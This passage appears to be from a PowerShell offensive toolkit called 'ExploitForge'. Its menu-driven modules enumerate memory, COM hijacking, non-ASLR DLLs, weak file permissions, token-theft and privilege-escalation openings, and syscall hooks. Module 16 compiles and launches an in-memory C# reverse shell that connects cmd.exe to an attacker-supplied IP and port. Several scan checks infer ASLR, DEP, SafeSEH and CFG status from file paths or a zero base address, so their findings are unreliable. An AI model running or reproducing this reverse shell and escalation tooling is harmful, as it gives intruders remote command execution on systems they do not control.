            Write-Host "`n[*] Enabled Privileges:" -ForegroundColor Green
            $whoamiPrivs | Select-String "Enabled" | ForEach-Object { Write-Host "    - $_" -ForegroundColor Yellow }
        } else {
            Write-Host "[!] Unable to retrieve privileges. Ensure you have necessary permissions." -ForegroundColor Red
        }
    } catch {
        Write-Host "[!] Error retrieving user privileges." -ForegroundColor Red
    }

    Show-Menu
}


# 9. Memory Analysis for Suspicious Regions
function Analyze-MemoryRegions {
    Write-Host "[+] Scanning running processes for suspicious memory regions with unusually high usage..." -ForegroundColor Cyan
    Write-Host "`n[+] Scanning for suspicious memory regions..." -ForegroundColor Cyan

    $isPS2 = ($PSVersionTable.PSVersion.Major -lt 3)

    # Convert 500MB to bytes (since PowerShell 2.0 lacks direct size filtering)
    $threshold = 500 * 1024 * 1024

    if ($isPS2) {
        Write-Host "[!] Running in PowerShell 2.0 - Using legacy process filtering method." -ForegroundColor Yellow
        $suspiciousRegions = Get-Process | Where-Object { $_.PrivateMemorySize -gt $threshold }
    } else {
        $suspiciousRegions = Get-Process | Where-Object { $_.PrivateMemorySize64 -gt $threshold }
    }

    if ($suspiciousRegions -and $suspiciousRegions.Count -gt 0) {
        foreach ($process in $suspiciousRegions) {
            $memUsageMB = [math]::Round($process.PrivateMemorySize64 / 1MB, 2)
            Write-Host "[!] High memory usage detected: $($process.Name) (PID: $($process.Id)) - $memUsageMB MB" -ForegroundColor Red
        }
    } else {
        Write-Host "[*] No suspicious memory regions detected." -ForegroundColor Green
    }

    Show-Menu
}



# 10 . Detect Suspicious COM-Hijacking
function Detect-COM-Hijacking {
    Write-Host "[+] Scanning registry for suspicious COM object hijacking attempts..." -ForegroundColor Cyan
    Write-Host "`n[+] Scanning for COM Object Hijacking..." -ForegroundColor Cyan

    $isPS2 = ($PSVersionTable.PSVersion.Major -lt 3)

    $comPaths = @(
        "HKCU:\Software\Classes\CLSID",
        "HKLM:\Software\Classes\CLSID",
        "HKCU:\Software\Wow6432Node\Classes\CLSID",
        "HKLM:\Software\Wow6432Node\Classes\CLSID",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID",
        "HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Shell Extensions\Approved",
        "HKLM:\Software\Microsoft\Windows\CurrentVersion\Shell Extensions\Approved"
    )

    foreach ($path in $comPaths) {
        try {
            if (Test-Path $path) {
                if ($isPS2) {
                    $items = Get-ItemProperty -Path "$path\*" -ErrorAction SilentlyContinue
                } else {
                    $items = Get-ItemProperty -Path "$path\*" -Name "(default)" -ErrorAction SilentlyContinue
                }

                foreach ($item in $items) {
                    if ($isPS2) {
                        if ($item.PSObject.Properties["(default)"] -and $item."(default)" -match "temp|system32|appdata") {
                            Write-Host "[!] Suspicious COM Object: $($item.PSPath)" -ForegroundColor Red
                        }
                    } else {
                        if ($item.Default -match "temp|system32|appdata") {
                            Write-Host "[!] Suspicious COM Object: $($item.PSPath)" -ForegroundColor Red
                        }
                    }
                }
            }
        } catch {
            Write-Host "[!] Error accessing $path. Ensure you have sufficient privileges." -ForegroundColor Yellow
        }
    }

    Show-Menu
}


# 11 . Enumerate-KernelMemory
function Enumerate-KernelMemory {
    param(
        [string]$Filter
    )
    Write-Host "[+] Enumerating kernel memory regions and categorizing them based on address ranges..." -ForegroundColor Cyan
    Write-Host "`n[+] Enumerating kernel memory regions..." -ForegroundColor Cyan

    $memoryRegions = $null
    if ($PSVersionTable.PSVersion.Major -ge 3) {
        try {
            $memoryRegions = Get-CimInstance Win32_DeviceMemoryAddress -ErrorAction SilentlyContinue
        } catch {
            $memoryRegions = Get-WmiObject Win32_DeviceMemoryAddress -ErrorAction SilentlyContinue
        }
    } else {
        $memoryRegions = Get-WmiObject Win32_DeviceMemoryAddress -ErrorAction SilentlyContinue
    }

    if ($memoryRegions -and $memoryRegions.Count -gt 0) {
        $totalRegions = 0
        $totalSize = 0

        foreach ($region in $memoryRegions) {
            try {
                $startAddr = [convert]::ToInt64($region.StartingAddress, 16)
                $endAddr = [convert]::ToInt64($region.EndingAddress, 16)
                $regionSize = $endAddr - $startAddr

                $regionType = switch ($startAddr) {
                    {$_ -lt 0x000A0000} { "Conventional Memory (RAM)" }
                    {$_ -ge 0x000A0000 -and $_ -lt 0x00100000} { "BIOS Reserved" }
                    {$_ -ge 0x00100000 -and $_ -lt 0x10000000} { "Kernel/Driver Space" }
                    {$_ -ge 0x10000000 -and $_ -lt 0x20000000} { "PCI Express MMIO" }
                    {$_ -ge 0x20000000 -and $_ -lt 0x40000000} { "GPU Memory Region" }
                    {$_ -ge 0x40000000 -and $_ -lt 0x80000000} { "Chipset Reserved / APIC" }
                    {$_ -ge 0x80000000} { "System Reserved / Paging" }
                    default { "Unknown/Device-Specific" }
                }

                if (-not [string]::IsNullOrWhiteSpace($Filter) -and $regionType -notmatch $Filter) {
                    continue
                }

                $totalRegions++
                $totalSize += $regionSize

                Write-Host "[*] Memory Region: Start $($region.StartingAddress) - End $($region.EndingAddress) | Size: $([math]::Round($regionSize / 1MB, 2)) MB | Type: $regionType" -ForegroundColor Yellow
            } catch {
                Write-Host "[!] Error processing memory region: Start $($region.StartingAddress) - End $($region.EndingAddress)" -ForegroundColor Red
            }
        }

        Write-Host "`n========== Memory Region Summary ==========" -ForegroundColor Cyan
        Write-Host "[✔] Total Regions: $totalRegions" -ForegroundColor Green
        Write-Host "[✔] Total Size: $([math]::Round($totalSize / 1MB, 2)) MB" -ForegroundColor Green
    } else {
        Write-Host "[!] No memory regions found or access denied." -ForegroundColor Red
    }

    Show-Menu
}



# 12 . Enumerate-NonASLR-DLLs
function Enumerate-NonASLR-DLLs {
    param(
        [string]$Filter
    )
    Write-Host "[+] Scanning DLLs for security weaknesses related to ASLR, DEP, SafeSEH, and CFG..." -ForegroundColor Cyan
    Write-Host "`n[+] Choose a scanning option:" -ForegroundColor Cyan
    Write-Host "1. Scan all loaded DLLs"
    Write-Host "2. Scan a specific directory"
    $choice = Read-Host "Enter choice (1 or 2)"

    $dlls = @()
    if ($choice -eq "2") {
        $customPath = Read-Host "Enter the full directory path to scan"
        if (-Not (Test-Path $customPath)) {
            Write-Host "[!] Error: The specified path '$customPath' does not exist." -ForegroundColor Red
            return
        }
        Write-Host "`n[+] Scanning DLLs in: $customPath" -ForegroundColor Yellow
        $dlls = Get-ChildItem -Path $customPath -Filter "*.dll" -Recurse -ErrorAction SilentlyContinue
    } else {
        Write-Host "`n[+] Scanning all loaded DLLs..." -ForegroundColor Cyan
        try {
            if ($PSVersionTable.PSVersion.Major -ge 3) {
                $dlls = Get-Process | ForEach-Object { $_.Modules } | Select-Object FileName, ModuleName, BaseAddress -ErrorAction SilentlyContinue
            } else {
                $dlls = Get-WmiObject Win32_Process | ForEach-Object {
                    if ($_.CommandLine -match "\.dll") { $_.CommandLine } else { $null }
                }
            }
        } catch {
            Write-Host "[!] Error retrieving process modules. Try running PowerShell as Administrator." -ForegroundColor Red
            return
        }
    }

    $results = @()
    $totalDLLs = 0
    $highRisk = 0
    $mediumRisk = 0
    $lowRisk = 0

    foreach ($dll in $dlls) {
        try {
            $baseAddr = if ($dll.BaseAddress) { [Int64]$dll.BaseAddress } else { 0 }
            $filePath = if ($dll.FileName) { $dll.FileName } else { "Unknown" }
            $moduleName = if ($dll.ModuleName) { $dll.ModuleName } else { "Unknown" }

            # Detect security flags
            $nonASLR = ($filePath -match "C:\\Windows\\System32" -and $baseAddr -lt 0x70000000)
            $depDisabled = ($baseAddr -eq 0) # DEP disabled if EntryPointAddress is null (fallback check)
            $safeSEH = ($filePath -match "C:\\Windows\\System32")
            $cfgEnabled = ($filePath -match "C:\\Windows\\System32")

            # Determine risk level
            $riskLevel = "✅ LOW (All Protections Enabled)"
            $color = "Green"
            if ($nonASLR -and $depDisabled) {
                $riskLevel = "❌ HIGH (No ASLR & No DEP)"
                $color = "Red"
                $highRisk++
            } elseif ($nonASLR -or $depDisabled) {
                $riskLevel = "⚠️ MEDIUM (One Protection Disabled)"
                $color = "Yellow"
                $mediumRisk++
            } else {
                $lowRisk++
            }

            # Generate risk details
            $riskDetails = @()
            if ($nonASLR) { $riskDetails += "ASLR is disabled (Base Address: 0x$($baseAddr.ToString('X')))" }
            if ($depDisabled) { $riskDetails += "DEP is disabled" }
            if (-not $safeSEH) { $riskDetails += "SafeSEH is disabled" }
            if (-not $cfgEnabled) { $riskDetails += "CFG (Control Flow Guard) is disabled" }

            # Apply filter
            if ([string]::IsNullOrWhiteSpace($Filter) -or $riskLevel -match $Filter) {
                $results += [PSCustomObject]@{
                    "DLL Name"      = $moduleName
                    "Base Address"  = "0x$($baseAddr.ToString('X'))"
                    "ASLR"          = if ($nonASLR) { "❌ Disabled" } else { "✅ Enabled" }
                    "DEP"           = if ($depDisabled) { "❌ Disabled" } else { "✅ Enabled" }
                    "SafeSEH"       = if ($safeSEH) { "✅ Enabled" } else { "❌ Disabled" }
                    "CFG"           = if ($cfgEnabled) { "✅ Enabled" } else { "❌ Disabled" }
                    "Risk Level"    = $riskLevel
                    "Risk Details"  = $riskDetails -join ", "
                    "Location"      = $filePath
                }
            }

            $totalDLLs++
        } catch {
            Write-Host "[*] Skipped: $moduleName (Error: $_)" -ForegroundColor Yellow
        }
    }

    if ($results.Count -gt 0) {
        Write-Host "`n[+] Detected DLLs with security risks:" -ForegroundColor Cyan
        $results | Sort-Object "Risk Level" | Format-Table -AutoSize | Out-String | ForEach-Object {
            if ($_ -match "❌ HIGH") {
                Write-Host $_ -ForegroundColor Red
            } elseif ($_ -match "⚠️ MEDIUM") {
                Write-Host $_ -ForegroundColor Yellow
            } else {
                Write-Host $_
            }
        }
    } else {
        Write-Host "[+] No non-ASLR or non-DEP DLLs detected." -ForegroundColor Green
    }

    Write-Host "`n========== Scan Summary ==========" -ForegroundColor Cyan
    Write-Host "[✔] Total DLLs Scanned: $totalDLLs" -ForegroundColor Green
    Write-Host "[!] High-Risk DLLs: $highRisk" -ForegroundColor Red
    Write-Host "[⚠️] Medium-Risk DLLs: $mediumRisk" -ForegroundColor Yellow
    Write-Host "[✅] Low-Risk DLLs: $lowRisk" -ForegroundColor Green

    Show-Menu
}



# 13 . Enumerate-WeakFilePermissions
function Enumerate-WeakFilePermissions {
    Write-Host "[+] Scanning for files with weak permissions that may allow unauthorized modifications..." -ForegroundColor Cyan
    Write-Host "`n[+] Choose an option:" -ForegroundColor Cyan
    Write-Host "1. Scan predefined critical system paths"
    Write-Host "2. Scan a specific path of your choice"
    $choice = Read-Host "Enter your choice (1 or 2)"

    $pathsToCheck = @()
    if ($choice -eq "2") {
        $customPath = Read-Host "Enter the full path to scan"
        if (-Not (Test-Path $customPath)) {
            Write-Host "[!] Error: The specified path '$customPath' does not exist." -ForegroundColor Red
            return
        }
        $pathsToCheck = @($customPath)
    } else {
        Write-Host "`n[+] Scanning predefined critical system paths..." -ForegroundColor Yellow
        $pathsToCheck = @(
            "C:\Windows\System32",
            "C:\Windows\SysWOW64",
            "C:\Windows\Tasks",
            "C:\Windows\Temp",
            "C:\Windows\Fonts",
            "C:\Windows\Debug",
            "C:\Windows\Installer",
            "C:\Program Files",
            "C:\Program Files (x86)",
            "C:\ProgramData",
            "C:\Users\Public",
            "C:\Users\Default",
            "C:\Users\Default\AppData\Local",
            "C:\Users\Default\AppData\Roaming",
            "C:\Users\Default\AppData\LocalLow",
            "C:\Users\Default\Desktop",
            "C:\Users\Default\Documents",
            "C:\Users\Default\Downloads",
            "C:\Users\Default\Pictures",
            "C:\Users\Default\Videos",
            "C:\Users\Default\Music"
        )
    }

    foreach ($path in $pathsToCheck) {
        if (-Not (Test-Path $path)) {
            Write-Host "[!] Skipping: Path does not exist: $path" -ForegroundColor Yellow
            continue
        }

        Write-Host "`nScanning: $path" -ForegroundColor Yellow

        try {
            $files = Get-ChildItem -Path $path -File -Recurse -ErrorAction SilentlyContinue
        } catch {
            Write-Host "[!] Error accessing $path. Ensure you have the necessary permissions." -ForegroundColor Red
            continue
        }

        foreach ($file in $files) {
            try {
                $filePath = $file.FullName

                # Use Get-Acl for PowerShell 2.0+ (Avoid WMI)
                $acl = Get-Acl -Path $filePath -ErrorAction SilentlyContinue

                if ($acl) {
                    $writable = $acl.Access | Where-Object {
                        ($_.FileSystemRights -match "Write|FullControl|Modify") -and
                        ($_.IdentityReference -match "Everyone|Authenticated Users|BUILTIN\\Users")
                    }

                    if ($writable) {
                        Write-Host "[!] Weak Permissions Detected: $filePath" -ForegroundColor Red
                    }
                }
            } catch {
                Write-Host "[!] Error processing file: $filePath" -ForegroundColor Yellow
            }
        }
    }

    Show-Menu
}



# 14 . Check-PrivEsc-Vulnerability
function Check-PrivEsc-Vulnerability {
    Write-Host "[+] Scanning for privilege escalation vulnerabilities, high-risk privileges, and token manipulation risks..." -ForegroundColor Cyan
    Write-Host "`n[+] Checking for privilege escalation vulnerabilities..." -ForegroundColor Cyan

    try {
        if ($PSVersionTable.PSVersion.Major -ge 3) {
            $privs = whoami /priv | Select-String "SeImpersonatePrivilege|SeAssignPrimaryTokenPrivilege|SeTcbPrivilege"
        } else {
            $privs = cmd /c "whoami /priv" | Select-String "SeImpersonatePrivilege|SeAssignPrimaryTokenPrivilege|SeTcbPrivilege"
        }
    } catch {
        Write-Host "[!] Unable to check privileges. Ensure you have the necessary permissions." -ForegroundColor Yellow
        $privs = $null
    }

    if ($privs) {
        Write-Host "[!] High-risk privileges detected! The system may be vulnerable." -ForegroundColor Red
        Write-Host "`n$privs`n" -ForegroundColor Yellow

        if ($privs -match "Enabled") {
            Write-Host "[+] These privileges are enabled. Exploitation may be possible!" -ForegroundColor Red
        } else {
            Write-Host "[!] Privileges exist but are not enabled. Token manipulation may still be possible." -ForegroundColor Yellow
        }
    } else {
        Write-Host "[+] No high-risk privileges found. The system is not vulnerable to token-based privilege escalation." -ForegroundColor Green
    }

    try {
        if ($PSVersionTable.PSVersion.Major -ge 3) {
            $osVer = (Get-CimInstance Win32_OperatingSystem).Version
        } else {
            $osVer = (Get-WmiObject Win32_OperatingSystem).Version
        }
    } catch {
        Write-Host "[!] Unable to retrieve Windows version." -ForegroundColor Yellow
        $osVer = "Unknown"
    }

    if ($osVer -match "^10" -or $osVer -match "^6.3" -or $osVer -match "^6.2") {
        Write-Host "[+] Windows version is compatible with Potato exploits (JuicyPotato, RoguePotato)." -ForegroundColor Green
    } else {
        Write-Host "[!] Windows version is not compatible with common Potato exploits." -ForegroundColor Yellow
    }

    Write-Host "`n[*] Checking for high-privilege processes that could be impersonated..." -ForegroundColor Cyan
    try {
        if ($PSVersionTable.PSVersion.Major -ge 3) {
            $highPrivProcesses = Get-CimInstance Win32_Process | Where-Object { $_.Name -in @(
                "services.exe", "winlogon.exe", "lsass.exe", "explorer.exe", "svchost.exe", 
                "taskmgr.exe", "wininit.exe", "smss.exe", "csrss.exe", "spoolsv.exe",
                "mmc.exe", "cmd.exe", "powershell.exe", "msiexec.exe", "dllhost.exe", 
                "werfault.exe", "wsmprovhost.exe", "conhost.exe", "rundll32.exe", 
                "wuauclt.exe", "dwm.exe", "searchindexer.exe", "winrs.exe", "System"
            ) }
        } else {
            $highPrivProcesses = Get-WmiObject Win32_Process | Where-Object { $_.Name -in @(
                "services.exe", "winlogon.exe", "lsass.exe", "explorer.exe", "svchost.exe", 
                "taskmgr.exe", "wininit.exe", "smss.exe", "csrss.exe", "spoolsv.exe",
                "mmc.exe", "cmd.exe", "powershell.exe", "msiexec.exe", "dllhost.exe", 
                "werfault.exe", "wsmprovhost.exe", "conhost.exe", "rundll32.exe", 
                "wuauclt.exe", "dwm.exe", "searchindexer.exe", "winrs.exe", "System"
            ) }
        }
    } catch {
        Write-Host "[!] Unable to retrieve high-privilege processes." -ForegroundColor Yellow
        $highPrivProcesses = $null
    }

    if ($highPrivProcesses) {
        Write-Host "[!] Found processes running with high privileges that may be vulnerable to token theft:" -ForegroundColor Yellow
        
        foreach ($proc in $highPrivProcesses) {
            $user = "Unknown"
            try {
                if ($PSVersionTable.PSVersion.Major -ge 3) {
                    $ownerInfo = Get-CimInstance Win32_Process -Filter "ProcessId=$($proc.ProcessId)" | Invoke-CimMethod -MethodName GetOwner
                    if ($ownerInfo) {
                        $user = "$($ownerInfo.Domain)\$($ownerInfo.User)"
                    }
                } else {
                    $ownerInfo = $proc.GetOwner()
                    if ($ownerInfo) {
                        $user = "$($ownerInfo.Domain)\$($ownerInfo.User)"
                    }
                }
            } catch {}

            $systemStatus = if ($user -match "NT AUTHORITY\\SYSTEM") { "SYSTEM - HIGH RISK" } else { "Not SYSTEM" }
            $color = if ($user -match "NT AUTHORITY\\SYSTEM") { "Red" } else { "Green" }

            Write-Host "    - $($proc.Name) (PID: $($proc.ProcessId)) - User: $user - Status: $systemStatus" -ForegroundColor $color
        }
    } else {
        Write-Host "[+] No high-privilege processes detected for token theft attacks." -ForegroundColor Green
    }

    Write-Host "`n[*] Confirming token theft possibility..." -ForegroundColor Cyan
    try {
        if ($PSVersionTable.PSVersion.Major -ge 3) {
            $tokenPrivs = whoami /priv | Select-String "SeImpersonatePrivilege|SeAssignPrimaryTokenPrivilege"
        } else {
            $tokenPrivs = cmd /c "whoami /priv" | Select-String "SeImpersonatePrivilege|SeAssignPrimaryTokenPrivilege"
        }
    } catch {
        $tokenPrivs = $null
    }

    if ($tokenPrivs -match "Enabled") {
        Write-Host "[!] Token manipulation privileges (SeImpersonate/SeAssignPrimaryToken) are ENABLED!" -ForegroundColor Red
        Write-Host "[!] This system is vulnerable to token theft and privilege escalation." -ForegroundColor Red
    } else {
        Write-Host "[+] Token manipulation privileges are NOT enabled. No immediate token theft risk." -ForegroundColor Green
    }

    Write-Host "`n[*] Checking for writable MSI installer files (MSI Hijacking)..." -ForegroundColor Cyan
    try {
        $msiFiles = Get-ChildItem -Path "C:\Windows\Installer\" -File -Filter "*.msi" -ErrorAction SilentlyContinue | Where-Object {
            (Get-Acl $_.FullName).Access | Where-Object { $_.FileSystemRights -match "Write|Modify|FullControl" -and $_.IdentityReference -match "Everyone|BUILTIN\\Users" }
        }
    } catch {
        $msiFiles = $null
    }

    if ($msiFiles) {
        Write-Host "[!] Writable MSI files found (Potential MSI hijacking vulnerability):" -ForegroundColor Red
        $msiFiles | ForEach-Object { Write-Host "    - $($_.FullName)" -ForegroundColor Yellow }
    } else {
        Write-Host "[+] No writable MSI files detected." -ForegroundColor Green
    }

    Write-Host "[+] Privilege Escalation Vulnerability Check Completed." -ForegroundColor Green
    Show-Menu
}





# 15 . Detect-SyscallHooks
function Detect-SyscallHooks {

    $isPS2 = ($PSVersionTable.PSVersion.Major -lt 3)

    # If SyscallDetector exists but ReadProcessMemory is missing, restart the script
    if ("SyscallDetector" -as [type]) {
        $methods = [SyscallDetector].GetMethods() | Where-Object { $_.Name -eq "ReadProcessMemory" }
        if (-not $methods) {
            Write-Host "[-] ReadProcessMemory is missing! Restarting PowerShell session..." -ForegroundColor Red
            Start-Process -FilePath "powershell.exe" -ArgumentList "-NoExit -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -WindowStyle Normal
            exit
        }
    }

    if (-not ("SyscallDetector" -as [type])) {
        try {
            Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class SyscallDetector {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool ReadProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        [Out] byte[] lpBuffer,
        int dwSize,
        out int lpNumberOfBytesRead
    );
}
"@ -Language CSharp
        } catch {
            Write-Host "[-] Failed to compile SyscallDetector. Ensure PowerShell is running with administrative privileges." -ForegroundColor Red
            Show-Menu
            return
        }
    }

    Write-Host "[+] Scanning ntdll.dll for hooked syscalls that may indicate security monitoring or tampering..." -ForegroundColor Cyan
    Write-Host "Scanning for hooked syscalls in ntdll.dll..." -ForegroundColor Cyan

    $ntdllHandle = [SyscallDetector]::GetModuleHandle("ntdll.dll")

    if ($ntdllHandle -eq [IntPtr]::Zero) {
        Write-Host "[-] Failed to get handle for ntdll.dll" -ForegroundColor Red
        Show-Menu
        return
    }

    $syscalls = @("NtOpenProcess", "NtCreateFile", "NtReadVirtualMemory", "NtWriteVirtualMemory", "NtQuerySystemInformation", "NtAllocateVirtualMemory", "NtProtectVirtualMemory")

    $logFile = "$env:TEMP\SyscallHookReport.txt"
    "`n--- Syscall Hook Detection Report ---`n" | Out-File -Append -Encoding utf8 $logFile

    foreach ($syscall in $syscalls) {
        $syscallAddress = [SyscallDetector]::GetProcAddress($ntdllHandle, $syscall)

        if ($syscallAddress -eq [IntPtr]::Zero) {
            Write-Host "[-] Failed to get address of $syscall" -ForegroundColor Red
            continue
        }

        # Read first 6 bytes to check for hooks
        $buffer = New-Object byte[] 6
        $bytesRead = 0
        try {
            if ($isPS2) {
                $processHandle = (Get-WmiObject Win32_Process -Filter "ProcessId='$PID'").Handle
            } else {
                $processHandle = (Get-Process -Id $PID).Handle
            }
        } catch {
            Write-Host "[-] Failed to get process handle for current process." -ForegroundColor Red
            Show-Menu
            return
        }

        try {
            $result = [SyscallDetector]::ReadProcessMemory($processHandle, $syscallAddress, $buffer, $buffer.Length, [ref]$bytesRead)
        } catch {
            $errorMessage = $Error[0].Exception.Message
            Write-Host "[-] Error calling ReadProcessMemory for " -NoNewline
            Write-Host "$syscall - " -NoNewline
            Write-Host "$errorMessage" -ForegroundColor Red
            continue
        }

        if ($result -eq $false -or $bytesRead -lt 6) {
            Write-Host "[-] Failed to read memory for $syscall" -ForegroundColor Yellow
            continue
        }

        # Check for common hook patterns (JMP, INT3, MOV ABS)
        $hookDetected = $false
        if ($buffer[0] -eq 0xE9) { 
            Write-Host "[!] Hook Detected: $syscall (JMP Instruction)" -ForegroundColor Red
            $hookDetected = $true
        } elseif ($buffer[0] -eq 0xCC) { 
            Write-Host "[!] Hook Detected: $syscall (INT3 Breakpoint)" -ForegroundColor Red
            $hookDetected = $true
        } elseif (($buffer[0] -eq 0x48 -and $buffer[1] -eq 0xB8) -or ($buffer[0] -eq 0xFF -and $buffer[1] -eq 0x25)) { 
            Write-Host "[!] Hook Detected: $syscall (MOV ABS / JMP ABS)" -ForegroundColor Red
            $hookDetected = $true
        } else {
            Write-Host "[*] $syscall is clean" -ForegroundColor Green
        }

        if ($hookDetected) {
            "[!] $syscall is hooked in memory at 0x$("{0:X}" -f $syscallAddress)" | Out-File -Append -Encoding utf8 $logFile
        } else {
            "[*] $syscall is clean" | Out-File -Append -Encoding utf8 $logFile
        }
    }

    Write-Host "`n[*] Syscall Hook Detection Completed. Report saved at: $logFile" -ForegroundColor Green
    Write-Host "`nReturning to menu..." -ForegroundColor Cyan
    Show-Menu
}


# 16 . Generate-ReverseShell
function Generate-ReverseShell {
    Write-Host "[+] Compiling and executing an in-memory C# reverse shell for remote command execution..." -ForegroundColor Cyan
    $AttackerIP = Read-Host "Enter attacker IP"
    $AttackerPort = Read-Host "Enter attacker port"

    if (-not ($AttackerIP -match "^\d{1,3}(\.\d{1,3}){3}$")) {
        Write-Host "[!] Invalid IP address. Please provide a valid IPv4 address." -ForegroundColor Red
        return
    }
    if ($AttackerPort -lt 1 -or $AttackerPort -gt 65535) {
        Write-Host "[!] Invalid port number. Please provide a port between 1 and 65535." -ForegroundColor Red
        return
    }

    $csharpCode = @"
using System;
using System.Net.Sockets;
using System.Text;
using System.Diagnostics;
using System.Threading;

public class ReverseShell
{
    public static void Main(string[] args)
    {
        // Start the reverse shell in a background thread
        Thread reverseShellThread = new Thread(RunReverseShell);
        reverseShellThread.IsBackground = true;
        reverseShellThread.Start();
    }

    private static void RunReverseShell()
    {
        string ip = "$AttackerIP";
        int port = $AttackerPort;

        int retryCount = 3;
        bool connected = false;
        while (retryCount > 0 && !connected)
        {
            try
            {
                using (TcpClient client = new TcpClient())
                {
                    // Set connection timeout (5 seconds)
                    var result = client.BeginConnect(ip, port, null, null);
                    bool success = result.AsyncWaitHandle.WaitOne(TimeSpan.FromSeconds(5));
                    if (!success)
                    {
                        throw new Exception("Connection timed out.");
                    }
                    client.EndConnect(result);
                    connected = true;

                    using (NetworkStream stream = client.GetStream())
                    {
                        using (Process proc = new Process())
                        {
                            proc.StartInfo.FileName = "cmd.exe";
                            proc.StartInfo.CreateNoWindow = true;
                            proc.StartInfo.UseShellExecute = false;
                            proc.StartInfo.RedirectStandardOutput = true;
                            proc.StartInfo.RedirectStandardInput = true;
                            proc.StartInfo.RedirectStandardError = true;
                            proc.OutputDataReceived += (sender, e) =>
                            {
                                if (!string.IsNullOrEmpty(e.Data))
                                {
                                    byte[] data = Encoding.ASCII.GetBytes(e.Data + "\n");
                                    stream.Write(data, 0, data.Length);
                                }
                            };
                            proc.ErrorDataReceived += (sender, e) =>
                            {
                                if (!string.IsNullOrEmpty(e.Data))
                                {
                                    byte[] data = Encoding.ASCII.GetBytes(e.Data + "\n");
                                    stream.Write(data, 0, data.Length);
                                }
                            };
                            proc.Start();
                            proc.BeginOutputReadLine();
                            proc.BeginErrorReadLine();

                            byte[] buffer = new byte[1024];
                            int bytesRead;
                            while (true)
                            {
                                if (stream.DataAvailable)
                                {
                                    bytesRead = stream.Read(buffer, 0, buffer.Length);
                                    string command = Encoding.ASCII.GetString(buffer, 0, bytesRead);
                                    proc.StandardInput.WriteLine(command);
                                }
                                else
                                {
                                    Thread.Sleep(100); // Avoid high CPU usage
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                retryCount--;
                if (retryCount == 0)
                {
                    Console.WriteLine("Failed to connect: " + ex.Message);
                }
                else
                {
                    Console.WriteLine("Retrying... Attempts left: " + retryCount);
                    Thread.Sleep(2000);
                }
            }
        }
    }
}
"@

    if (-not ([System.Management.Automation.PSTypeName]'ReverseShell').Type)
    {
        Write-Host "[+] Compiling and executing C# reverse shell in memory..." -ForegroundColor Cyan
        try {
            Add-Type -TypeDefinition $csharpCode -Language CSharp
        }
        catch {
            Write-Host "[!] Failed to compile C# code. Error: $_" -ForegroundColor Red
            Write-Host "[+] Returning to the main menu..." -ForegroundColor Green
            return
        }
    }
    else
    {
        Write-Host "[!] ReverseShell type already exists. Skipping compilation." -ForegroundColor Yellow
    }

    [ReverseShell]::Main(@())

    Write-Host "[+] Reverse shell is running in the background. Returning to main menu..." -ForegroundColor Green
    Show-Menu
}

# =======================
# Main Menu
# =======================

function Show-Menu {
    Write-Host "`nSelect an enumeration module to run:" -ForegroundColor Yellow
    Write-Host "[1]  Kernel Exploit Detection & CVE Mapping"
    Write-Host "[2]  ROP & JOP Gadget Finder"
    Write-Host "[3]  Syscall Index Extractor "
    Write-Host "[4]  Heap Spray Analysis"
    Write-Host "[5]  DLL Hijacking Scanner"
    Write-Host "[6]  Enumerate NamedPipes"
    Write-Host "[7]  Direct Syscall Execution for Exploits"
    Write-Host "[8]  Detect Privilege Escalation Paths (Token Analysis)"
    Write-Host "[9]  Memory Analysis for Suspicious Regions"
    Write-Host "[10] Detect Suspicious COM-Hijacking"
    Write-Host "[11] Enumerate KernelMemory"
    Write-Host "[12] Enumerate NonASLR-DLLs"
    Write-Host "[13] Enumerate WeakFilePermissions"
    Write-Host "[14] Check-PrivEsc-Vulnerability"
    Write-Host "[15] Detect-SyscallHooks"
    Write-Host "[16] Generate-ReverseShell"
    Write-Host "[17] Exit`n"

    $choice = Read-Host "Enter your choice"
    switch ($choice) {
        1  { Detect-KernelExploits }
        2  { Find-ROP-JOP-Gadgets }
        3  { Extract-SyscallIndexes }
        4  { Analyze-HeapSpray }
        5  { Find-DLLHijacking }
        6  { Enumerate-NamedPipes }
        7  { Execute-Syscall }
        8  { Analyze-Privileges }
        9  { Analyze-MemoryRegions }
        10 { Detect-COM-Hijacking }
        11 { Enumerate-KernelMemory }
        12 { Enumerate-NonASLR-DLLs }
        13 { Enumerate-WeakFilePermissions }
        14 { Check-PrivEsc-Vulnerability }
        15 { Detect-SyscallHooks }
        16 { Generate-ReverseShell }
        17  { Write-Host "Exiting ExploitForge." -ForegroundColor Green; exit }
        default { Write-Host "Invalid option, try again." -ForegroundColor Red; Show-Menu }
    }
}

Show-Logo
Show-Menu



